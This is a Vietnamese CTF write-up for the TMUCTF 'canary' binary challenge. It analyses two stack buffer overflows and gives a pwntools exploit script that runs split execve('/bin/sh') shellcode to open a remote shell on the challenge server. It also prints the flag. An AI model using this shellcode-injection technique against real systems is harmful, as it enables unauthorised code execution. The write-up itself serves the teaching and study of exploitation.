# CANARY
# Reverse file
file 64-bit, dynamically linked, và không có stripped.
```sh
zir@ubuntu:~/Desktop$ file canary
canary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1bf7fbedab28e21b8519ef1d1629ddd9a7056ef8, for GNU/Linux 3.2.0, not stripped

```
Checksec file: mình thấy rằng 
* NX disabled - được quyền thực thi trên stack, có thể chạy shellcode trên stack.
* No canary found - chương trình không tạo ra 1 chuỗi ngẫu nhiên để ngăn việc buffer overflow.
```sh
zir@ubuntu:~/Desktop$ checksec canary
[*] '/home/zir/Desktop/canary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments

```

Đưa file canary vào IDA để xem pseudocode, nhận thấy luồng chương trình sẽ có 3 hàm quan trọng: 
* main
* compare
* printresult.

```sh
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Main func -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  tmulogo();
  puts(
    "Welcome to our String Comparison System!\n"
    "Enter two strings to be compared with each other. \n"
    "We will tell you the comparison result.\n");
  compare();
  return 0;
}
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Compare func -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

int compare()
{
  char s2[15]; // [rsp+2h] [rbp-2Eh] BYREF
  char v2[27]; // [rsp+11h] [rbp-1Fh] BYREF
  int v3; // [rsp+2Ch] [rbp-4h]

  strcpy(v2, "noshellcode");
  puts("Enter first string (up to 15 chars): ");
  readline(&v2[12], 0x1BuLL);
  puts("Enter second string (up to 15 chars): ");
  readline(s2, 0xFuLL);
  puts("Note that we have a canary between these two strings and you cannot inject any shellcode!\n");
  printf("Do not you believe? Here is the canary address: %p\n", v2);
  v3 = strcmp(&v2[12], s2);
  if ( !strcmp(v2, "noshellcode") )
    return printresult(v3);
  else
    return puts("You overwrite the canary :|\nNo results for you. Bye Bye.\n");
}

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Printresult func -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

int __fastcall printresult(int a1)
{
  char s[12]; // [rsp+14h] [rbp-Ch] BYREF

  puts(
    "===================================================================\n"
    "Thank you for using our system.\n"
    "If you don't mind, leave your phone number for us in order to inform you about our new productions later!\n"
    "\n"
    "Enter your phone number: ");
  fgets(s, 32, stdin);
  puts("\nThis is the comparison result: ");
  if ( a1 )
    return puts("---> * The strings are not equal! *");
  else
    return puts("---> * The strings are equal! *");
}
```

Chương trình sẽ cho mình nhập khoảng 3 lần:
* Trong hàm compare:
    * Copy chuỗi "noshellcode" vào biến v2.
    * Lần 1: Nhập 27 kí tự, bắt đầu từ &v2[12]  ----------> BufferOverflow
    * Lần 2: Nhập 15 byte vào biến s2.
    * In ra địa chỉ bắt đầu của biến v2.
    * So sánh 2 giá trị vừa nhập vào s2 và &v2[12] với nhau và đưa giá trị tối đa 4 byte vào trong biến v3 (kiểu int), đóng vai trò như 1 canary.
    * So sánh biến v2 với chuỗi "noshellcode", nếu bằng nhau sẽ gọi hàm printresult(v3), chuẩn bị cho lần nhập lần 3.
* Trong hàm printresult:
    * Lần 3: Nhập 32 kí tự vào S[12] -------------> BufferOverflow
    * In 1 số chuỗi ra.

# Solution

Chương trình cho mình 3 lần nhập, 1 địa chỉ trên stack, NX disabled, No Canary found. Mình sẽ sử dụng shellcode cho bài này. Đây là sơ đồ mình đã debug và ghi nhận địa chỉ của từng lần nhập, mình sẽ sắp xếp theo thứ tự địa chỉ tăng dần.

* Lần 3: 0x7ffce8205554 - 0x7ffce8205574 (32)
* Lần 2: 0x7ffce8205572 - 0x7ffce8205581 (15)
* Lần 1: 0x7ffce820558d - 0x7ffce82055a8 (27)

```sh

0x7ffce8205554 --> 0x7ffce8205572 --> 0x7ffce8205581 --> 0x7ffce820558d --> 0x7ffce82055a8

|-------------------------------------------------- v2[0-11] ----------- v3---------------->

```

Trong sơ đồ trên có 2 chướng ngại:
* v2[0-11] chứa chuỗi "noshellcode"
* v3 chứa giá trị từ hàm strcmp(&v2[12],s2) tối đa 4 byte.

Mình sẽ nhập shellcode chia ra làm 2 phần, phần đầu shellcode sẽ nhập vào lần 2, và phần sau sẽ nhập vào lần 1. Lần nhập thứ 3 mình sẽ RET về địa chỉ chứa shellcode.

Sử dụng 1 số lệnh nhảy để bỏ qua n byte bằng lệnh '\xeb\xn' để bỏ qua các chướng ngại.

## File exploit.py
```python
from pwn import * 
#s = process("./canary")
s = remote("185.97.117.19", 7030)
pause()

sc1 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\xeb\x0c"
sc2 = "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xeb\x04aaaa\xb0\x3b\x48\x31\xF6\x0f\x05\x00"



s.sendline(sc2)
s.sendline(sc1)
s.recvuntil("canary address: ")

stack_addr = int(s.recv(14),16) - 0xf 

payload = "c"*(0xc+8) + p64(stack_addr)
s.sendline(payload)
s.interactive()

#sc = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

# 0xc-0x1b = 0xf 
# 0xc la offset tu dia chi leak den PHAN SAU cua SHELLCODE
# 0x1b la offset tu PHANSAU cua SHELLCODE den PHANDAU cua SHELLCODE


```

## Flag >> `TMUCTF{3x3cu74bl3_574ck_15_v3ry_d4n63r0u5}`

